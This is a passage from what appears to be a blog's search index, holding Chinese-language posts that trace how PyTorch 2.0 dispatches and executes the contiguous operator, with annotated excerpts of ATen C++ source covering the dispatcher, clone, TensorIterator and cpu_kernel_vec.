[=](Vectorized\u003cscalar_t\u003e a) -\u003e Vectorized\u003cscalar_t\u003e { return a; }); }); } } AT_DISPATCH_ALL_TYPES_AND_COMPLEX_AND3 宏展开后代码如下 // aten/src/ATen/native/cpu/CopyKernel.cpp [\u0026] { const auto\u0026 the_type = dtype; constexpr const char* at_dispatch_name = \"copy_kernel\"; at::ScalarType _st = ::detail::scalar_type(the_type); switch (_st) { case at::ScalarType::Byte: { /* ... */ } case at::ScalarType::Char: { /* ... */ } case at::ScalarType::Int: { /* ... */ } case at::ScalarType::Long: { /* ... */ } case at::ScalarType::Short: { /* ... */ } case at::ScalarType::Double: { /* ... */ } case at::ScalarType::Float: { if constexpr (!at::should_include_kernel_dtype( at_dispatch_name, at::ScalarType::Float)) { // error check } using scalar_t __attribute__((__unused__)) = c10::impl::ScalarTypeToCPPTypeT\u003cat::ScalarType::Float\u003e; return [\u0026] { cpu_kernel_vec( iter, [=](scalar_t a) -\u003e scalar_t { return a; }, [=](Vectorized\u003cscalar_t\u003e a) -\u003e Vectorized\u003cscalar_t\u003e { return a; }); }(); } case at::ScalarType::ComplexDouble: { /* ... */ } case at::ScalarType::ComplexFloat: { /* ... */ } case kBool: { /* ... */ } case kHalf: { /* ... */ } case kBFloat16: { /* ... */ } } } 到这里copy kernel本身的内容已经调用完成，将两个匿名函数传给了cpu_kernel_vec ","date":"2023-05-13","objectID":"/posts/pytorch/how_pytorch_call_op_3/:4:0","tags":null,"title":"How Pytorch 2.0 Call Ops(3)","uri":"/posts/pytorch/how_pytorch_call_op_3/"},{"categories":["pytorch"],"content":"11. cpu_kernel_vec底层运行原理 cpu_kernel_vec支持标量化函数和向量化函数作参数，我们展开其细节 // aten/src/ATen/native/cpu/Loops.h template \u003cbool check_dynamic_cast=true, typename func_t, typename vec_func_t\u003e void cpu_kernel_vec(TensorIteratorBase\u0026 iter, func_t\u0026\u0026 op, vec_func_t\u0026\u0026 vop, int64_t grain_size = at::internal::GRAIN_SIZE) { // ... some check // make_vectorized_loop2d将标量op和向量化op整合成一个对象`VectorizedLoop2d`给for_each iter.for_each(make_vectorized_loop2d(op, vop), grain_size); // cast_outputs方法用于将输出张量按照当前数据类型进行强制类型转换 iter.cast_outputs(); } // aten/src/ATen/TensorIterator.cpp void TensorIteratorBase::for_each(loop2d_t loop, int64_t grain_size) { int64_t numel = this-\u003enumel(); if (numel == 0) { return; } else if (numel \u003c grain_size || at::get_num_threads() == 1) { // 如果元素数量少于grain_size或者线程数为1，使用串行操作 return serial_for_each(loop, {0, numel}); } else { // 否则，划分为grain_size大小的多个任务，每个任务里再串行迭代 at::parallel_for(0, numel, grain_size, [\u0026](int64_t begin, int64_t end) { serial_for_each(loop, {begin, end}); }); } } 我们继续深入展开串行操作serial_for_each，注意operands_这个变量，它是TensorIterator的operands集合SmallVector\u003cOperandInfo, 4\u003e operands_;，包括inputs和outputs的tensor，其中output一定位于第一个（这部分介绍在上文iterator构建过程中） // aten/src/ATen/TensorIterator.cpp void TensorIteratorBase::serial_for_each(loop2d_t loop, Range range) const { if (range.size() == 0) { return; } const auto ntensors = this-\u003entensors(); // 由于上面构建TensorIterator的时候进行了维度合并，所以这里ndim为2 const auto ndim = this-\u003endim(); c10::SmallBuffer\u003cchar*, 4\u003e ptrs(ntensors); // 此处总strides长4 c10::SmallBuffer\u003cint64_t, 8\u003e strides(ntensors * std::max(ndim, 2)); // 这里operands_是 TensorIteratorBase的tensor op列表 // `get_base_ptrs`拿到了所有tensor的storage指针，转化为char*类型，存储在指针列表中 at::get_base_ptrs(ptrs.data(), operands_); // `get_strides`则将所有tensor stride按序存储到strides中（低维到高维排列） // 低维到高维排列是为了方便下面取值计算 // 如我们的例子中，strides最后为[4, 80, 256, 4] 注意这里是int64_t数据类型 // 其中out tensor的stride为[4, 256], input tensor的stride为[80, 4] at::get_strides(strides.data(), operands_, ndim); at::internal::serial_for_each( shape_, strides, ptrs.data(), ptrs.size(), loop, range); } // aten/src/ATen/TensorIteratorInternal.h inline void serial_for_each( IntArrayRef shape, IntArrayRef strides, char** base_ptrs, size_t ntensors, typename TensorIteratorBase::loop2d_t loop, Range range) { const auto ndim = shape.size(); // ... if (ndim \u003c= 1) { // ... } else { // 这里又创建了和上面一样声明的ptrs，但此处的ptrs存放的是当前batch中需要处理的地址 c10::SmallBuffer\u003cchar*, 4\u003e ptrs(ntensors); auto counter = DimCounter(shape, range); // 通过DimCounter确保每一个element都被处理过，is_done判断offset是否大于range.end while (!counter.is_done()) { get_data_ptrs( ptrs.data(), {base_ptrs, ntensors}, strides, counter.values); auto step = counter.max_2d_step(); loop(ptrs.data(), strides.data(), step[0], step[1]); counter.increment(step); } } } 这里的DimCounter是何方神圣呢？ // aten/src/ATen/TensorIteratorInternal.h struct DimCounter { DimCounter(IntArrayRef shape, Range range); void increment(const std::array\u003cint64_t, 2\u003e\u0026 step); bool is_done() const; // return offset \u003e= range.end; std::array\u003cint64_t, 2\u003e max_2d_step() const; IntArrayRef shape; Range range; // range是处理的element范围，如{0, numel()} c10::SmallBuffer\u003cint64_t, 4\u003e values; // 每个维度上的offset，注意是元素的offset，不是stride int64_t offset; // 当前处理的元素offset }; DimCounter::DimCounter(IntArrayRef shape, Range range) : shape(shape) , range(range) , values(shape.size()) , offset(range.begin) { std::fill(values.begin(), values.end(), 0); if (range.begin == 0) { return; } int64_t linear_offset = range.begin; int64_t ndim = values.size(); for (const auto dim : c10::irange(ndim)) { int64_t size = shape[dim]; if (size \u003e 0) { // 我们举一个新例子，如begin = 1066670, size = [64, 2000, 10], 此处values存下了余数offset [46, 666, 8]， // 这里的offset之后乘以stride就可以算出总体offset，来实现直接找到当前range的begin位置 values[dim] = linear_offset % size; linear_offset /= size; } } TORCH_INTERNAL_ASSERT(linear_offset == 0); } 注意get_data_ptrs方法，此处取到了当前range的起始指针，存放到ptrs中（ptrs[0]为output的指针，其余为input指针） // aten/src/ATen/TensorIteratorInternal.h inline void get_data_ptrs( char** ptrs, ArrayRef\u003cchar*\u003e base, IntArrayRef stri","date":"2023-05-13","objectID":"/posts/pytorch/how_pytorch_call_op_3/:5:0","tags":null,"title":"How Pytorch 2.0 Call Ops(3)","uri":"/posts/pytorch/how_pytorch_call_op_3/"},{"categories":["pytorch"],"content":"12. contiguous执行流程回顾 虽然我们展开了很多底层技术细节，如tensor_iterator如何预处理tensor，dim counter如何取需处理的step，loop2d如何实现迭代等，但从上层理解，最关键的调用链路为以下两段代码： // aten/src/ATen/native/TensorProperties.cpp Tensor contiguous(const Tensor\u0026 self, MemoryFormat memory_format) { if (self.is_contiguous(memory_format)) { return self; } return self.clone(memory_format); } // aten/src/ATen/native/TensorFactories.cpp Tensor clone(const Tensor\u0026 src, c10::optional\u003cc10::MemoryFormat\u003e optional_memory_format) { // ... Tensor self; self = at::empty_like(src, src.options(), memory_format); if (src._is_zerotensor()) { self.zero_(); } else { self.copy_(src); } return self; } 即先判断是否contiguous，如果非contiguous则按照指定memory format clone tensor，在clone算子中，先empty出一个指定memory format的新tensor，然后copy_将旧tensor的数据按照stride等信息复制到新tensor上。 ","date":"2023-05-13","objectID":"/posts/pytorch/how_pytorch_call_op_3/:6:0","tags":null,"title":"How Pytorch 2.0 Call Ops(3)","uri":"/posts/pytorch/how_pytorch_call_op_3/"},{"categories":["pytorch"],"content":"Reference pybind11-gil pytorch-github Pytorch Tensor 加法实现细节 Confused about some of the content? Feel free to report an issue here. ","date":"2023-05-13","objectID":"/posts/pytorch/how_pytorch_call_op_3/:7:0","tags":null,"title":"How Pytorch 2.0 Call Ops(3)","uri":"/posts/pytorch/how_pytorch_call_op_3/"},{"categories":["pytorch"],"content":"Summary This article introduces the process of pytorch 2.0 calling ops, using contiguous as an example. ","date":"2023-04-12","objectID":"/posts/pytorch/how_pytorch_call_op_2/:1:0","tags":null,"title":"How Pytorch 2.0 Call Ops(2)","uri":"/posts/pytorch/how_pytorch_call_op_2/"},{"categories":["pytorch"],"content":"To be translated Oh Sorry! This blog has’t been translated to English, please wait for a little while… ","date":"2023-04-12","objectID":"/posts/pytorch/how_pytorch_call_op_2/:2:0","tags":null,"title":"How Pytorch 2.0 Call Ops(2)","uri":"/posts/pytorch/how_pytorch_call_op_2/"},{"categories":["pytorch"],"content":"6. register和dispatch的回顾 我们纵观register和dispatch的过程，总结其大体流程为： 注册op schema 注册op下的具体kernel实现（基于dispatch key） 查找op schema 查找op下具体kernel实现并调用（基于dispatch key） 中间几个重要的数据类型：Dispatcher, OperatorHandle, OperatorEntry Dispatcher operatorLookupTable_维护了OperatorName-\u003eOperatorHandle的映射 // aten/src/ATen/core/dispatch/Dispatcher.h class TORCH_API Dispatcher final { private: friend class impl::OperatorEntry; struct OperatorDef final { explicit OperatorDef(OperatorName\u0026\u0026 op_name) : op(std::move(op_name)) {} impl::OperatorEntry op; size_t def_count = 0; size_t def_and_impl_count = 0; }; friend class OperatorHandle; template\u003cclass\u003e friend class TypedOperatorHandle; public: // ... static Dispatcher\u0026 realSingleton(); c10::optional\u003cOperatorHandle\u003e findSchema(const OperatorName\u0026 operator_name); template\u003cclass Return, class... Args\u003e Return call(const TypedOperatorHandle\u003cReturn (Args...)\u003e\u0026 op, Args... args) const; RegistrationHandleRAII registerImpl(/* ... */); private: // ... std::list\u003cOperatorDef\u003e operators_; LeftRight\u003cska::flat_hash_map\u003cOperatorName, OperatorHandle\u003e\u003e operatorLookupTable_; ska::flat_hash_map\u003cstd::string, std::string\u003e libraries_; }; OperatorHandle 其内部的operatorDef_本质是上面Dispatcher中的OperatorDef，是对OperatorEntry的封装 更多时候用的是TypedOperatorHandle，OperatorHandle的子类，可以理解为针对op参数模板化的OperatorHandle // aten/src/ATen/core/dispatch/Dispatcher.h class TORCH_API OperatorHandle { template \u003ctypename T\u003e friend struct std::hash; public: const OperatorName\u0026 operator_name() const { return operatorDef_-\u003eop.operator_name(); } const FunctionSchema\u0026 schema() const { return operatorDef_-\u003eop.schema(); } // ... template\u003cclass FuncType\u003e TypedOperatorHandle\u003cFuncType\u003e typed() const { // ... return TypedOperatorHandle\u003cFuncType\u003e(operatorIterator_); } private: // ... friend class Dispatcher; template\u003cclass\u003e friend class TypedOperatorHandle; Dispatcher::OperatorDef* operatorDef_; std::list\u003cDispatcher::OperatorDef\u003e::iterator operatorIterator_; }; OperatorEntry： 实际存储op信息的数据结构 // aten/src/ATen/core/dispatch/OperatorEntry.h class TORCH_API OperatorEntry final { public: explicit OperatorEntry(OperatorName\u0026\u0026 operator_name); const FunctionSchema\u0026 schema() const { return schema_-\u003eschema; } void registerSchema(FunctionSchema\u0026\u0026, std::string\u0026\u0026 debug, std::vector\u003cat::Tag\u003e tags = {}); void deregisterSchema(); const OperatorName\u0026 operator_name() const { return name_; } using AnnotatedKernelContainer = std::list\u003cAnnotatedKernel\u003e; // linked list using AnnotatedKernelContainerIterator = AnnotatedKernelContainer::iterator; AnnotatedKernelContainerIterator registerKernel(/* ... */); void deregisterKernel_(/* ... */); const DispatchKeyExtractor\u0026 dispatchKeyExtractor() const { return dispatchKeyExtractor_; } const KernelFunction\u0026 lookup(DispatchKeySet ks) const { const auto idx = ks.getDispatchTableIndexForDispatchKeySet(); // ... const auto\u0026 kernel = dispatchTable_[idx]; // ... return kernel; } private: OperatorName name_; c10::optional\u003cAnnotatedSchema\u003e schema_; std::array\u003cKernelFunction, c10::num_runtime_entries\u003e dispatchTable_; DispatchKeyExtractor dispatchKeyExtractor_; ska::flat_hash_map\u003cDispatchKey, std::list\u003cAnnotatedKernel\u003e\u003e kernels_; c10::optional\u003cCppSignatureWithDebug\u003e cpp_signature_; // ... }; 通过 Library -\u003e Dispatcher -\u003e OperatorHandle -\u003e OperatorEntry 这样的调用链路，pytorch完成了op和对应kernel的注册。之后，pytorch就可以基于这条链路查找到所需算子的kernel并轻松实现调用。 ","date":"2023-04-12","objectID":"/posts/pytorch/how_pytorch_call_op_2/:3:0","tags":null,"title":"How Pytorch 2.0 Call Ops(2)","uri":"/posts/pytorch/how_pytorch_call_op_2/"},{"categories":["pytorch"],"content":"7. is_contiguous判断是否连续 大致了解了pytorch算子的注册和调用流程之后，我们终于进入了contiguous算子实际执行的流程了，这部分相对而言简单很多。 我们将调用路径拉回到上文dispatch末端 // build/aten/src/ATen/RegisterCompositeImplicitAutograd.cpp at::Tensor wrapper_CompositeImplicitAutograd__contiguous(const at::Tensor \u0026 self, at::MemoryFormat memory_format) { return at::native::contiguous(self, memory_format); } 这里调用aten native的contiguous算子 // aten/src/ATen/native/TensorProperties.cpp Tensor contiguous(const Tensor\u0026 self, MemoryFormat memory_format) { if (self.is_contiguous(memory_format)) { return self; } TORCH_CHECK( memory_format != MemoryFormat::Preserve, \"preserve memory format is unsupported by the contiguous operator\"); return self.clone(memory_format); } 首先判断is_contiguous(memory_format)，即在指定memory format下是否已经连续，经过TensorBase.h中转来到TensorImpl.h中 // c10/core/TensorImpl.h struct C10_API TensorImpl : public c10::intrusive_ptr_target { bool is_contiguous_default(at::MemoryFormat memory_format) const { // ... if (memory_format == at::MemoryFormat::ChannelsLast) { return is_channels_last_contiguous_; } else if (memory_format == at::MemoryFormat::ChannelsLast3d) { return is_channels_last_3d_contiguous_; } return is_contiguous_; } // ... protected: std::unique_ptr\u003cc10::ExtraMeta\u003e extra_meta_ = nullptr; c10::impl::SizesAndStrides sizes_and_strides_; int64_t storage_offset_ = 0; int64_t numel_ = 1; caffe2::TypeMeta data_type_; c10::optional\u003cc10::Device\u003e device_opt_; // ... bool is_contiguous_ : 1; bool is_channels_last_ : 1; bool is_channels_last_contiguous_ : 1; bool is_channels_last_3d_ : 1; bool is_channels_last_3d_contiguous_ : 1; } 可以看到，pytorch的判断is_contiguous并没有计算，而是将数据直接存储在TensorImpl里，每次直接取用即可，这样省去了计算量，但也要求在更改tensor stride或者初始化的时候算出相关bool并存储。 那么，它是如何被设置的呢？我们溯源该变量的set流程，发现它被refresh_contiguous()设置，每次修改tensor的shape或stride的时候都要调用该方法。 // c10/core/TensorImpl.h void _refresh_contiguous() { auto type_id = identity\u003cT\u003e(); switch (dim()) { case 4: { _set_is_contiguous(type_id, compute_contiguous(type_id)); _set_is_channels_last_contiguous( type_id, compute_channels_last_contiguous_2d(type_id)); _set_is_channels_last_3d_contiguous(type_id, false); // ... break; } case 5: { _set_is_contiguous(type_id, compute_contiguous(type_id)); _set_is_channels_last_contiguous( type_id, compute_channels_last_contiguous_2d(type_id)); _set_is_channels_last_3d_contiguous( type_id, compute_channels_last_contiguous_3d_dim5(type_id)); // ... break; } default: _set_is_contiguous(type_id, compute_contiguous(type_id)); _set_is_channels_last_contiguous(type_id, false); _set_is_channels_last_3d_contiguous(type_id, false); // ... } } 我们挑一个_compute_channels_last_contiguous_2d展开看看，其本质就是在contiguous（NCHW）标准下，是否符合NHWC（1320置换）： template \u003ctypename T\u003e bool _compute_channels_last_contiguous_2d( ArrayRef\u003cT\u003e sizes, ArrayRef\u003cT\u003e strides) { switch (sizes.size()) { case 4: { T expected = 1; // const array可以被编译器自动展开加速 for (auto\u0026 d : {1, 3, 2, 0}) { const auto\u0026 size_d = sizes[d]; if (size_d != 1) { if (strides[d] != expected) { return false; } expected *= size_d; } } return true; } // ... default: return false; } } 例如一个N, C, H, W = 2, 2048, 1, 1的tensor，它的stride为[2048, 1, 1, 1] 就是一个channels last的tensor（同时也是contiguous的tensor，因为内存排布刚好h、w都是1） ","date":"2023-04-12","objectID":"/posts/pytorch/how_pytorch_call_op_2/:4:0","tags":null,"title":"How Pytorch 2.0 Call Ops(2)","uri":"/posts/pytorch/how_pytorch_call_op_2/"},{"categories":["pytorch"],"content":"8. clone算子：自动微分与empty tensor 继续我们的调用流程，如果tensor在指定memory format下已经连续，那就直接返回，如果不连续，那就按照指定memory format进行clone // build/aten/src/ATen/core/TensorBody.h inline at::Tensor Tensor::clone(c10::optional\u003cat::MemoryFormat\u003e memory_format) const { return at::_ops::clone::call(const_cast\u003cTensor\u0026\u003e(*this), memory_format); } // build/aten/src/ATen/Operators_1.cpp at::Tensor clone::call(const at::Tensor \u0026 self, c10::optional\u003cat::MemoryFormat\u003e memory_format) { static auto op = create_clone_typed_handle(); return op.call(self, memory_format); } 是不是很熟悉？是的，这就是我们上面调用contiguous算子的入口，再经过类似的dispatch流程（找op schema，然后找kernel）后我们来到了实际clone处。由于上面contiguous的dispatch key是CompositeImplicitAutograd，这里clone算子也调用到该disptach key并需要处理自动微分相关逻辑。 这与我们对clone算子的印象也是一致的：完全独立的副本，保留requires_grad属性并支持自动求导（CloneBackward0放入grad_fn中）。 // torch/csrc/autograd/generated/VariableType_1.cpp at::Tensor clone(c10::DispatchKeySet ks, const at::Tensor \u0026 self, c10::optional\u003cat::MemoryFormat\u003e memory_format) { // 此处调用`checked_cast_variable`检查tensor是否defined // self_和self地址相同 auto\u0026 self_ = unpack(self, \"self\", 0); // 自动求导相关，如果需要自动求导，则设置grad_fn到graph里 auto _any_requires_grad = compute_requires_grad( self ); (void)_any_requires_grad; auto _any_has_forward_grad_result = (isFwGradDefined(self)); (void)_any_has_forward_grad_result; std::shared_ptr\u003cCloneBackward0\u003e grad_fn; if (_any_requires_grad) { grad_fn = std::shared_ptr\u003cCloneBackward0\u003e(new CloneBackward0(), deleteNode); grad_fn-\u003eset_next_edges(collect_next_edges( self )); } #ifndef NDEBUG // 拿到self的storage和impl c10::optional\u003cStorage\u003e self__storage_saved = self_.has_storage() ? c10::optional\u003cStorage\u003e(self_.storage()) : c10::nullopt; c10::intrusive_ptr\u003cTensorImpl\u003e self__impl_saved; if (self_.defined()) self__impl_saved = self_.getIntrusivePtr(); #endif // 将当前dispatchkey和c10::after_autograd_keyset运算后，redisptach clone算子 // redispatch的结果是拿到了clone的正确结果，redisptach的过程我们下文展开 auto _tmp = ([\u0026]() { at::AutoDispatchBelowADInplaceOrView guard; return at::redispatch::clone(ks \u0026 c10::after_autograd_keyset, self_, memory_format); })(); auto result = std::move(_tmp); // ... return result; } 值得指出的是，在上面代码中redisptach的过程中，在重新计算dispatchkey之后，redisptach到aten的clone算子。redispatch和call有什么区别呢？ 一方面，是函数签名上的差异，redispatch带了一个currentDispatchKeySet，就不用像call那样从op里取dispatchkey，直接用参数传进来的就好。 Return Dispatcher::call(const TypedOperatorHandle\u003cReturn(Args...)\u003e\u0026 op, Args... args) const inline Return Dispatcher::redispatch(const TypedOperatorHandle\u003cReturn (Args...)\u003e\u0026 op, DispatchKeySet currentDispatchKeySet, Args... args) const 另一方面，是redispatch调用中，一般会将当前dispatchkey再下调一个优先级（如与c10::after_autograd_keyset进行与操作），然后调度到实际执行clone的算子上（此处已经处理了自动微分，之后就不再需要考虑自动微分），做了一层分级 redispatch后到CompositeExplicitAutograd.cpp // build/aten/src/ATen/RegisterCompositeExplicitAutograd.cpp at::Tensor wrapper_CompositeExplicitAutograd__clone(const at::Tensor \u0026 self, c10::optional\u003cat::MemoryFormat\u003e memory_format) { return at::native::clone(self, memory_format); } // aten/src/ATen/native/TensorFactories.cpp Tensor clone(const Tensor\u0026 src, c10::optional\u003cc10::MemoryFormat\u003e optional_memory_format) { // ... Tensor self; if (memory_format == MemoryFormat::Preserve) { // ... } else { // 创建空tensor self = at::empty_like(src, src.options(), memory_format); } if (src._is_zerotensor()) { self.zero_(); } else { self.copy_(src); } return self; } 创建tensor时调用了empty_like算子，创建一个和src相同（但memory format为新memory format）的空tensor，一样经过dispatch后来到TensorFactories.cpp，然后empty_like又调用了empty算子（先call到build/aten/src/ATen/RegisterBackendSelect.cpp处，然后redispatch到CPU上——redispatch到哪根据编译选项不同会有差异） // aten/src/ATen/native/TensorFactories.cpp Tensor empty_like( const Tensor\u0026 self, c10::optional\u003cScalarType\u003e dtype, c10::optional\u003cLayout\u003e layout, c10::optional\u003cDevice\u003e device, c10::optional\u003cbool\u003e pin_memory, c10::optional\u003cc10::MemoryFormat\u003e optional_memory_format) { // ... Tensor result; if (memory_format == MemoryFormat::Preserve) { // ... } else { result = at::empty(self.sizes(), options.memory_format(memory_format), c10::nullopt); } // ... return result; } ","date":"2023-04-12","objectID":"/posts/pytorch/how_pytorch_call_op_2/:5:0","tags":null,"title":"How Pytorch 2.0 Call Ops(2)","uri":"/posts/pytorch/how_pytorch_call_op_2/"},{"categories":["pytorch"],"content":"Summary This article introduces the process of pytorch 2.0 calling ops, using contiguous as an example. ","date":"2023-03-11","objectID":"/posts/pytorch/how_pytorch_call_op_1/:1:0","tags":null,"title":"How Pytorch 2.0 Call Ops(1)","uri":"/posts/pytorch/how_pytorch_call_op_1/"},{"categories":["pytorch"],"content":"To be translated Oh Sorry! This blog has’t been translated to English, please wait for a little while… ","date":"2023-03-11","objectID":"/posts/pytorch/how_pytorch_call_op_1/:2:0","tags":null,"title":"How Pytorch 2.0 Call Ops(1)","uri":"/posts/pytorch/how_pytorch_call_op_1/"},{"categories":["pytorch"],"content":"0. 引入 我们首先看这么一段代码 import torch N, C, H, W = 1, 64, 5, 4 x = torch.rand(N, C, H, W) x = x.contiguous(memory_format=torch.channels_last) print(x.shape) # torch.Size([1, 64, 5, 4]) print(x.stride()) # (1280, 1, 256, 64) print(x.is_contiguous()) # False 它会将NCHW的内存分布转换为NHWC（channel last）的内存分布，进而在一些特定场景下取得更好的性能提升（如conv2d） contiguous是如何被导出到python层的？其底层实际运行逻辑是怎样的呢？我们将一层层往下走，并最终将调用链路串联起来，揭开pytorch调用算子流程的面纱。 ","date":"2023-03-11","objectID":"/posts/pytorch/how_pytorch_call_op_1/:3:0","tags":null,"title":"How Pytorch 2.0 Call Ops(1)","uri":"/posts/pytorch/how_pytorch_call_op_1/"},{"categories":["pytorch"],"content":"1. c++ 到 python：contiguous如何被导出 python层对于contiguous没有额外封装，直接使用c++导出的pyi声明 # torch/_C/__init__.pyi # Defined in torch/csrc/autograd/python_variable.cpp class _TensorMeta(type): ... # Defined in torch/csrc/autograd/python_variable.cpp class _TensorBase(metaclass=_TensorMeta): def contiguous(self, memory_format=torch.contiguous_format) -\u003e Tensor: ... 可以看到，contiguous是_TensorBase的一个类方法。_TensorBase使用_TensorMeta作为元类（一种python机制，可以动态地修改类内部的属性或方法）。 _TensorBase是如何被导出到python层的呢？pytorch使用python自带的PyModuleDef机制创建了torchmodule，随后调用THPVariable_initModule并通过PyModule_AddObject导出 // torch/csrc/Module.cpp PyObject* initModule() { // ... static struct PyModuleDef torchmodule = { PyModuleDef_HEAD_INIT, \"torch._C\", nullptr, -1, methods.data()}; ASSERT_TRUE(module = PyModule_Create(\u0026torchmodule)); ASSERT_TRUE(THPVariable_initModule(module)); // ... } // torch/csrc/autograd/python_variable.cpp bool THPVariable_initModule(PyObject* module) { // .... PyModule_AddObject(module, \"_TensorMeta\", (PyObject*)\u0026THPVariableMetaType); // .... static std::vector\u003cPyMethodDef\u003e methods; THPUtils_addPyMethodDefs(methods, torch::autograd::variable_methods); THPUtils_addPyMethodDefs(methods, extra_methods); // 将`variable_methods`并放到`THPVariableType.tp_methods`中 THPVariableType.tp_methods = methods.data(); if (PyType_Ready(\u0026THPVariableType) \u003c 0) return false; Py_INCREF(\u0026THPVariableType); PyModule_AddObject(module, \"_TensorBase\", (PyObject*)\u0026THPVariableType); // .... return true; } 我们的contiguous方法便位于variable_methods中，进而作为_TensorBase的成员方法被导出到python层。 ","date":"2023-03-11","objectID":"/posts/pytorch/how_pytorch_call_op_1/:4:0","tags":null,"title":"How Pytorch 2.0 Call Ops(1)","uri":"/posts/pytorch/how_pytorch_call_op_1/"},{"categories":["pytorch"],"content":"2. 代码生成简述：native_functions.yaml和variable_methods variable_methods被定义在tools/autograd/templates/python_variable_methods.cpp中。 // tools/autograd/templates/python_variable_methods.cpp PyMethodDef variable_methods[] = { // ... other functions {\"contiguous\", castPyCFunctionWithKeywords(THPVariable_contiguous), METH_VARARGS | METH_KEYWORDS, NULL}, ${py_method_defs} } 但注意，此处仅仅是模板，并不是实际被编译运行的代码。实际上，算子开发中有很多函数代码相似，pytorch为了减少重复的工作量，引入了一种代码生成机制，简单来说是基于native.yaml和模板来生成代码，具体逻辑可见torchgen/gen.py，我们不过多展开。 在编译pytorch后，我们可以在generated文件夹下看到更多内容，如新生成的unsqueeze // torch/csrc/autograd/generated/python_variable_methods.cpp PyMethodDef variable_methods[] = { // other functions {\"contiguous\", castPyCFunctionWithKeywords(THPVariable_contiguous), METH_VARARGS | METH_KEYWORDS, NULL}, // generated new functions {\"unsqueeze\", castPyCFunctionWithKeywords(THPVariable_unsqueeze), METH_VARARGS | METH_KEYWORDS, NULL}, {\"unsqueeze_\", castPyCFunctionWithKeywords(THPVariable_unsqueeze_), METH_VARARGS | METH_KEYWORDS, NULL}, } unsqueeze_来自native_functions.yaml中的定义，替换了在模板中的${py_method_defs} - func: unsqueeze_(Tensor(a!) self, int dim) -\u003e Tensor(a!) variants: method device_check: NoCheck device_guard: False tags: inplace_view dispatch: CompositeExplicitAutograd: unsqueeze_ func：描述函数名称及参数、输出类型等 variants：method或function，指生成tensor method或单独function device_check：确保传递给kernel的所有tensor在同一device上 device_guard：确保kernel在指定设备下执行（匹配第一个tensor参数的设备） dispatch：指定后端与对应的函数。CompositeExplicitAutograd指的是显式自动微分dispatch key，需要在derivative.yaml写明微分规则。如果是CompositeImplicitAutograd则不需要，这是基于该算子底层算子都支持自动微分实现的，如conv2d。 tags：算子标签，详见链接 值得指出的是，由于contiguous代码较为复杂，所以在tools/autograd/templates/python_variable_methods.cpp中已经有了完整内容，并不是通过{py_method_defs}生成出来的。 ","date":"2023-03-11","objectID":"/posts/pytorch/how_pytorch_call_op_1/:5:0","tags":null,"title":"How Pytorch 2.0 Call Ops(1)","uri":"/posts/pytorch/how_pytorch_call_op_1/"},{"categories":["pytorch"],"content":"3. contiguous的调用：在dispatch前 注意：我们调用流程走的是aten算子，而不是torchprim的版本算子。笔者是基于cpu编译的pytorch，没有走cuda（cudnn/triton） 如果读者想要gdb调试CPP部分，请设置环境变量export DEBUG=1再编译。如果希望运行时看到调用链路，可以设置export TORCH_SHOW_DISPATCH_TRACE=1。 由上文可知，我们放到tensorbase里的contiguous函数为THPVariable_contiguous，这里是直接与python层交互的函数，负责解析参数、执行调用等。 // torch/csrc/autograd/generated/python_variable_methods.cpp static PyObject * THPVariable_contiguous(PyObject* self, PyObject* args, PyObject* kwargs) { static PythonArgParser parser({ \"contiguous(*, MemoryFormat memory_format=contiguous_format)\", }); ParsedArgs\u003c1\u003e parsed_args; auto r = parser.parse(self, args, kwargs, parsed_args); // 将self参数解析成`at::Tensor` auto\u0026 self_ = THPVariable_Unpack(self); auto memory_format = r.memoryformat(0); if (self_.is_contiguous(memory_format)) { // jit::tracer does something ... return self; } return THPVariable_Wrap(dispatch_contiguous(self_, memory_format)); } 简单而言就是解析python参数，随后判断当前tensor对于所需的memory_format是否contiguous，如果是的话直接返回，否则调用dispatch_contiguous。is_contiguous()的具体内容我们下文展开 // torch/csrc/autograd/generated/python_variable_methods.cpp static Tensor dispatch_contiguous(const Tensor \u0026 self, at::MemoryFormat memory_format) { // 释放`Global Interpreter Lock (GIL)` pybind11::gil_scoped_release no_gil; OptionalDeviceGuard device_guard(device_of(self)); return self.contiguous(memory_format); } pybind11::gil_scoped_release释放了Global Interpreter Lock (GIL)来提高性能（pybind11不会隐式释放，一切由用户操作，如果在释放后还需要访问python object，那么就必须require，详见pybind11-gil。在此处由于我们已经把参数全部解析成c++参数，所以可以自由释放gil了。 OptionalDeviceGuard device_guard是一种RAII（Resource Acquisition Is Initialization，资源获取即初始化）的guard，在构造函数中设置为某一设备，在析构函数中取消设置。相对DeviceGuard，OptionalDeviceGuard允许传一个nullopt，等效于optional\u003cDeviceGuard\u003e。这里我们不做展开，有兴趣的读者可以参考c10/core/DeviceGuard.h 之后调用self.contiguous() // build/aten/src/ATen/core/TensorBody.h class TORCH_API Tensor: public TensorBase { // .... Tensor contiguous(MemoryFormat memory_format=MemoryFormat::Contiguous) const { return TensorBase::contiguous(memory_format); } } // aten/src/ATen/core/TensorBase.h class TORCH_API TensorBase { // ... TensorBase contiguous(MemoryFormat memory_format=MemoryFormat::Contiguous) const { if (is_contiguous(memory_format)) { return *this; } else { return __dispatch_contiguous(memory_format); } } } 细心的读者可能发现，在tensorbase里它再次调用了is_contiguous方法，这是否和上面THPVariable_contiguous中重复了呢？对于我们例子中从python中调用下来确实是重复了，但contiguous并不是只有python层一个入口，c++层其他tensor也可能调用，所以这里需要加上。 那能不能python层不检查呢，都到此处来检查？理论上也是可以的，但相对而言就会多走一些调用流，降低运行效率。而后文我们会展开is_contiguous的判断逻辑，由于其采取了变量形式存储，所以is_contiguous运行效率非常高的，因此权衡之下将is_contiguous多次调用。 随后调用TensorBase的__dispatch_contiguous()方法 // aten/src/ATen/core/Tensor.cpp TensorBase TensorBase::__dispatch_contiguous(c10::MemoryFormat memory_format) const { OptionalTensorRef self(*this); return at::_ops::contiguous::call(*self, memory_format); } 注意此处将tensorbase转成了OptionalTensorRef self，这将使成员方法调用变成函数方法调用，即self变成了之后调用contiguous算子的参数 这也和native_functions.yaml中参数声明对应起来了aten::contiguous(Tensor(a) self, *, MemoryFormat memory_format=contiguous_format) -\u003e Tensor(a) ","date":"2023-03-11","objectID":"/posts/pytorch/how_pytorch_call_op_1/:6:0","tags":null,"title":"How Pytorch 2.0 Call Ops(1)","uri":"/posts/pytorch/how_pytorch_call_op_1/"},{"categories":["pytorch"],"content":"4. dispatch contiguous算子：找schema与call kernel 调用at::_ops::contiguous::call()来到基于native_functions.yaml生成的文件Operators_4.cpp中 dispatch分为两步，第一步找到function schema，第二步调用schema中符合条件的kernel（如cpu tensor调度到cpu kernel、cuda tensor到cuda kernel等，该过程后面详细展开） // build/aten/src/ATen/Operators_4.cpp 